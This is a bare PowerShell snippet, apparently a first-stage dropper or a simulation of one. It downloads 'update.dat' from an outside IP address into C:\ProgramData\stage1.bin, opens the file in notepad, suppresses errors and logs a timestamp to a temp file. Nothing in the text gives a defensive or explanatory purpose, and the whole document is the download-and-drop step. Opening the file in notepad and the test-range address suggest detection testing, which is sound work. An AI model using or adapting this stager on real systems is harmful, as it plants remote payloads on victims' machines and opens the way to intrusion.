
try { $FetchUrl = 'http://192.0.2.234:80/update.dat'; $DropPath = 'C:\ProgramData\stage1.bin'; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DropPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
